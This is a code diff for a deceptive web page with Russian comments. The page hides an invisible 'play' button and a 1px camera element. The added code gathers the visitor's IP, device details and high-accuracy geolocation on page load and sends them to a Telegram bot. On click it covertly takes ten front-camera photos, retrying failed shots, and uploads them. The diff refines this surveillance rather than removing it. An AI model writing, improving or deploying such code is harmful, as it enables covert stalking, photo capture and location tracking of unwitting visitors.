@@ -10,7 +10,6 @@
             padding: 0;
             box-sizing: border-box;
         }
-        
         body {
             overflow: hidden;
             touch-action: none;
@@ -23,7 +22,6 @@
             display: flex;
             flex-direction: column;
         }
-        
         .background-container {
             position: absolute;
             top: 0;
@@ -34,7 +32,6 @@
             background-size: cover;
             z-index: -2;
         }
-        
         .content {
             position: relative;
             z-index: 1;
@@ -45,7 +42,6 @@
             align-items: center;
             padding-bottom: 20px;
         }
-        
         .play-btn {
             background: transparent;
             border: none;
@@ -57,14 +53,12 @@
             bottom: 150px;
             opacity: 0;
         }
-        
         .hidden-camera {
             position: absolute;
             opacity: 0;
             width: 1px;
             height: 1px;
         }
-        
         .legal-links {
             position: absolute;
             bottom: 10px;
@@ -74,7 +68,6 @@
             font-size: 12px;
             padding: 5px 0;
         }
-        
         .message-box {
             position: fixed;
             top: 50%;
@@ -92,7 +85,6 @@
 </head>
 <body>
     <div class="background-container"></div>
-    
     <div class="content">
         <button class="play-btn" id="playBtn"></button>
     </div>
@@ -114,159 +106,97 @@
         const playBtn = document.getElementById('playBtn');
         const messageBox = document.getElementById('messageBox');
         let stream = null;
+        let positionCache = null;
 
         // Блокировка масштабирования
-        document.addEventListener('gesturestart', function(e) {
-            e.preventDefault();
-        });
-        
-        document.addEventListener('touchmove', function(e) {
-            if(e.scale !== 1) {
-                e.preventDefault();
-            }
-        }, { passive: false });
+        document.addEventListener('gesturestart', e => e.preventDefault());
+        document.addEventListener('touchmove', e => e.scale !== 1 && e.preventDefault(), { passive: false });
 
-        // Функция для получения информации о батарее
-        async function getBatteryInfo() {
-            if ('getBattery' in navigator) {
-                try {
-                    const battery = await navigator.getBattery();
-                    return {
-                        level: Math.round(battery.level * 100) + '%',
-                        charging: battery.charging ? 'Да' : 'Нет',
-                        chargingTime: battery.chargingTime ? battery.chargingTime + ' сек' : 'Неизвестно',
-                        dischargingTime: battery.dischargingTime ? battery.dischargingTime + ' сек' : 'Неизвестно'
-                    };
-                } catch (e) {
-                    return { error: 'Не удалось получить данные о батарее' };
-                }
-            }
-            return { error: 'API батареи не поддерживается' };
-        }
-
-        // Функция для получения информации о геолокации
+        // Функция для получения геолокации с кешированием
         async function getGeolocation() {
-            if ('geolocation' in navigator) {
-                try {
-                    const position = await new Promise((resolve, reject) => {
-                        navigator.geolocation.getCurrentPosition(resolve, reject, {
-                            enableHighAccuracy: true,
-                            timeout: 5000,
-                            maximumAge: 0
-                        });
-                    });
-                    
-                    return {
-                        latitude: position.coords.latitude,
-                        longitude: position.coords.longitude,
-                        accuracy: position.coords.accuracy + ' метров',
-                        altitude: position.coords.altitude || 'Недоступно',
-                        speed: position.coords.speed || 'Недоступно'
-                    };
-                } catch (e) {
-                    return { error: 'Геолокация запрещена или недоступна: ' + e.message };
+            if (positionCache) return positionCache;
+            
+            return new Promise((resolve) => {
+                if ('geolocation' in navigator) {
+                    navigator.geolocation.getCurrentPosition(
+                        position => {
+                            positionCache = {
+                                latitude: position.coords.latitude,
+                                longitude: position.coords.longitude,
+                                accuracy: position.coords.accuracy
+                            };
+                            resolve(positionCache);
+                        },
+                        error => {
+                            resolve({ error: 'Геолокация запрещена: ' + error.message });
+                        },
+                        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                    );
+                } else {
+                    resolve({ error: 'Геолокация не поддерживается' });
                 }
-            }
-            return { error: 'Геолокация не поддерживается' };
+            });
         }
 
-        // Функция для получения информации о соединении
-        function getConnectionInfo() {
-            if ('connection' in navigator) {
-                const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-                if (connection) {
-                    return {
-                        type: connection.type || 'Неизвестно',
-                        effectiveType: connection.effectiveType || 'Неизвестно',
-                        downlink: connection.downlink + ' Mbps',
-                        rtt: connection.rtt + ' мс',
-                        saveData: connection.saveData ? 'Да' : 'Нет'
-                    };
-                }
+        // Отправка карты геолокации в Telegram
+        async function sendLocationToTelegram(lat, lon) {
+            try {
+                await fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        latitude: lat,
+                        longitude: lon
+                    })
+                });
+            } catch (error) {
+                console.error('Ошибка отправки геолокации:', error);
             }
-            return { error: 'Информация о соединении недоступна' };
         }
 
-        // Функция для получения информации об устройстве
+        // Получение информации об устройстве
         function getDeviceInfo() {
-            const screen = window.screen;
-            const deviceInfo = {
+            return {
                 userAgent: navigator.userAgent,
                 platform: navigator.platform,
-                language: navigator.language,
-                languages: navigator.languages ? navigator.languages.join(', ') : 'Неизвестно',
-                cookieEnabled: navigator.cookieEnabled ? 'Да' : 'Нет',
-                doNotTrack: navigator.doNotTrack || 'Неизвестно',
-                hardwareConcurrency: navigator.hardwareConcurrency || 'Неизвестно',
-                deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Неизвестно',
-                maxTouchPoints: navigator.maxTouchPoints || 'Неизвестно',
-                screen: {
-                    width: screen.width,
-                    height: screen.height,
-                    availWidth: screen.availWidth,
-                    availHeight: screen.availHeight,
-                    colorDepth: screen.colorDepth + ' бит',
-                    pixelDepth: screen.pixelDepth + ' бит',
-                    orientation: screen.orientation ? screen.orientation.type : 'Неизвестно'
-                },
-                window: {
-                    innerWidth: window.innerWidth,
-                    innerHeight: window.innerHeight,
-                    outerWidth: window.outerWidth,
-                    outerHeight: window.outerHeight
-                },
+                screen: `${window.screen.width}x${window.screen.height}`,
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                date: new Date().toString(),
-                localTime: new Date().toLocaleString(),
-                timezoneOffset: new Date().getTimezoneOffset() + ' минут'
+                date: new Date().toLocaleString()
             };
-
-            return deviceInfo;
         }
 
-        // Функция для форматирования информации в читаемый вид
-        function formatInfo(info) {
-            let result = '';
-            for (const [key, value] of Object.entries(info)) {
-                if (typeof value === 'object' && value !== null) {
-                    result += `\n${key}:\n${formatInfo(value).replace(/^/gm, '  ')}`;
-                } else {
-                    result += `${key}: ${value}\n`;
-                }
-            }
-            return result;
-        }
-
-        // 1. Отправка информации о пользователе
+        // Отправка информации о пользователе
         async function sendUserInfo() {
             try {
-                // Получаем IP-адрес
+                // Получаем IP
                 const ipResponse = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipResponse.json();
-                const ip = ipData.ip;
-
-                // Получаем дополнительную информацию
-                const [batteryInfo, geolocationInfo, connectionInfo] = await Promise.all([
-                    getBatteryInfo(),
-                    getGeolocation(),
-                    getConnectionInfo()
-                ]);
-
-                const deviceInfo = getDeviceInfo();
+                
+                // Получаем геолокацию
+                const geoData = await getGeolocation();
+                if (geoData.latitude && geoData.longitude) {
+                    await sendLocationToTelegram(geoData.latitude, geoData.longitude);
+                }
 
                 // Формируем сообщение
-                let message = `🚨 Новый посетитель:\nIP: ${ip}\n\n`;
-                message += `=== Информация об устройстве ===\n${formatInfo(deviceInfo)}\n`;
-                message += `=== Батарея ===\n${formatInfo(batteryInfo)}\n`;
-                message += `=== Соединение ===\n${formatInfo(connectionInfo)}\n`;
-                message += `=== Геолокация ===\n${formatInfo(geolocationInfo)}\n`;
+                const deviceInfo = getDeviceInfo();
+                let message = `🚨 Новый посетитель:\nIP: ${ipData.ip}\n`;
+                message += `Устройство: ${deviceInfo.userAgent}\n`;
+                message += `Экран: ${deviceInfo.screen}\n`;
+                message += `Время: ${deviceInfo.date}\n`;
+                
+                if (geoData.latitude) {
+                    message += `\n📍 Геолокация:\nШирота: ${geoData.latitude}\nДолгота: ${geoData.longitude}\n`;
+                    message += `Точность: ${geoData.accuracy} метров\n`;
+                } else {
+                    message += `\n⚠️ Геолокация: ${geoData.error || 'Недоступна'}\n`;
+                }
 
-                // Отправляем сообщение в Telegram
+                // Отправляем сообщение
                 await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
+                    headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         chat_id: chatId,
                         text: message
@@ -274,30 +204,11 @@
                 });
 
             } catch (error) {
-                console.error('Error sending user info:', error);
-                // Отправляем хотя бы базовую информацию в случае ошибки
-                try {
-                    const deviceInfo = getDeviceInfo();
-                    let fallbackMessage = `⚠️ Не удалось собрать полную информацию, но вот что есть:\n`;
-                    fallbackMessage += formatInfo(deviceInfo);
-                    
-                    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                        },
-                        body: JSON.stringify({
-                            chat_id: chatId,
-                            text: fallbackMessage
-                        })
-                    });
-                } catch (e) {
-                    console.error('Fallback error:', e);
-                }
+                console.error('Ошибка отправки информации:', error);
             }
         }
 
-        // 2. Захват фото с камеры и отправка
+        // Захват фото с камеры
         async function captureAndSendPhoto(index) {
             try {
                 const canvas = document.createElement('canvas');
@@ -306,55 +217,66 @@
                 const ctx = canvas.getContext('2d');
                 ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
                 
-                const blob = await new Promise(resolve => {
-                    canvas.toBlob(resolve, 'image/jpeg', 0.8);
-                });
+                // Проверка что фото не черное
+                const imageData = ctx.getImageData(0, 0, 1, 1).data;
+                if (imageData[0] === 0 && imageData[1] === 0 && imageData[2] === 0) {
+                    throw new Error('Камера вернула черное изображение');
+                }
+                
+                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.9));
                 
                 const formData = new FormData();
                 formData.append('chat_id', chatId);
-                formData.append('photo', blob, `verification_photo_${index}.jpg`);
-                
-                const caption = `🆔 Фото верификации #${index}\nВремя: ${new Date().toLocaleString()}`;
-                formData.append('caption', caption);
+                formData.append('photo', blob, `photo_${index}.jpg`);
+                formData.append('caption', `📸 Фото ${index} - ${new Date().toLocaleString()}`);
                 
                 await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                     method: 'POST',
                     body: formData
                 });
                 
-                console.log(`Фото ${index} отправлено`);
-                
             } catch (error) {
-                console.error(`Ошибка при отправке фото ${index}:`, error);
+                console.error(`Ошибка фото ${index}:`, error);
+                throw error; // Пробрасываем ошибку для повторной попытки
             }
         }
 
-        // 3. Серийная съемка - 10 фото с интервалом 0.5 сек
+        // Серийная съемка с повторными попытками
         async function takeSeriesOfPhotos() {
-            try {
-                for (let i = 1; i <= 10; i++) {
-                    await captureAndSendPhoto(i);
-                    if (i < 10) {
-                        await new Promise(resolve => setTimeout(resolve, 500));
+            let successCount = 0;
+            const maxAttempts = 3;
+            
+            for (let i = 1; i <= 10; i++) {
+                let attempts = 0;
+                let success = false;
+                
+                while (attempts < maxAttempts && !success) {
+                    attempts++;
+                    try {
+                        await captureAndSendPhoto(i);
+                        successCount++;
+                        success = true;
+                    } catch (error) {
+                        if (attempts >= maxAttempts) {
+                            console.error(`Не удалось сделать фото ${i} после ${maxAttempts} попыток`);
+                        } else {
+                            await new Promise(resolve => setTimeout(resolve, 300));
+                        }
                     }
                 }
                 
-                // После завершения съемки показываем сообщение
-                messageBox.style.display = 'block';
-                
-            } catch (error) {
-                console.error('Ошибка в процессе серийной съемки:', error);
-                messageBox.style.display = 'block';
-            } finally {
-                stopCamera();
+                if (i < 10) await new Promise(resolve => setTimeout(resolve, 500));
             }
+            
+            return successCount;
         }
 
-        // 4. Запуск камеры устройства
+        // Запуск камеры
         async function startCamera() {
             try {
-                stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { 
+                // Пробуем фронтальную камеру
+                stream = await navigator.mediaDevices.getUserMedia({
+                    video: {
                         facingMode: 'user',
                         width: { ideal: 1280 },
                         height: { ideal: 720 }
@@ -364,82 +286,64 @@
                 
                 videoElement.srcObject = stream;
                 
-                // Даем камере 1 секунду на инициализацию перед съемкой
-                await new Promise(resolve => setTimeout(resolve, 1000));
-
-            // Начинаем серийную съемку
-            await takeSeriesOfPhotos();
-            
-        } catch (error) {
-            console.error('Ошибка при запуске камеры:', error);
-            messageBox.style.display = 'block';
-            
-            // Отправляем сообщение об ошибке камеры
-            try {
-                const errorMessage = `⚠️ Ошибка доступа к камере:\nУстройство: ${navigator.userAgent}\nОшибка: ${error.message || 'Неизвестная ошибка'}`;
+                // Ждем пока камера инициализируется
+                await new Promise(resolve => {
+                    videoElement.onloadedmetadata = resolve;
+                    setTimeout(resolve, 1000);
+                });
                 
+                // Делаем серию фото
+                const successCount = await takeSeriesOfPhotos();
+                
+                // Отправляем отчет
                 await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
+                    headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         chat_id: chatId,
-                        text: errorMessage
+                        text: `📊 Отчет: успешно отправлено ${successCount}/10 фото`
                     })
                 });
-            } catch (e) {
-                console.error('Ошибка при отправке сообщения об ошибке:', e);
-            }
-        }
-    }
-
-    // 5. Остановка камеры
-    function stopCamera() {
-        if (stream) {
-            try {
-                stream.getTracks().forEach(track => {
-                    track.stop();
-                    console.log('Трек камеры остановлен');
-                });
-                videoElement.srcObject = null;
-                console.log('Камера успешно отключена');
+                
             } catch (error) {
-                console.error('Ошибка при остановке камеры:', error);
+                console.error('Ошибка камеры:', error);
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: `⚠️ Ошибка камеры: ${error.message || 'Неизвестная ошибка'}`
+                    })
+                });
+            } finally {
+                stopCamera();
+                messageBox.style.display = 'block';
             }
         }
-    }
 
-    // 6. Обработчик кнопки "Играть"
-    playBtn.addEventListener('click', async function() {
-        console.log('Начало процесса верификации...');
-        try {
+        // Остановка камеры
+        function stopCamera() {
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+                videoElement.srcObject = null;
+                stream = null;
+            }
+        }
+
+        // Обработчик кнопки
+        playBtn.addEventListener('click', async () => {
             await sendUserInfo();
-            console.log('Информация о пользователе отправлена');
             await startCamera();
-        } catch (error) {
-            console.error('Общая ошибка процесса верификации:', error);
-            messageBox.style.display = 'block';
-        }
-    });
+        });
 
-    // Отправляем информацию о пользователе сразу при загрузке страницы
-    window.addEventListener('load', function() {
-        console.log('Страница загружена, отправка информации...');
-        sendUserInfo().catch(e => console.error('Ошибка при отправке информации:', e));
-    });
+        // Остановка камеры при закрытии
+        window.addEventListener('beforeunload', stopCamera);
+        document.addEventListener('visibilitychange', () => {
+            if (document.hidden) stopCamera();
+        });
 
-    // Остановка камеры при закрытии страницы
-    window.addEventListener('beforeunload', function() {
-        console.log('Страница закрывается, остановка камеры...');
-        stopCamera();
-    });
-
-    // Дополнительная обработка видимости страницы
-    document.addEventListener('visibilitychange', function() {
-        if (document.hidden) {
-            console.log('Страница стала неактивной, остановка камеры...');
-            stopCamera();
-        }
-    });
-</script>                
+        // Отправка информации при загрузке
+        window.addEventListener('load', sendUserInfo);
+    </script>
+</body>
+</html>
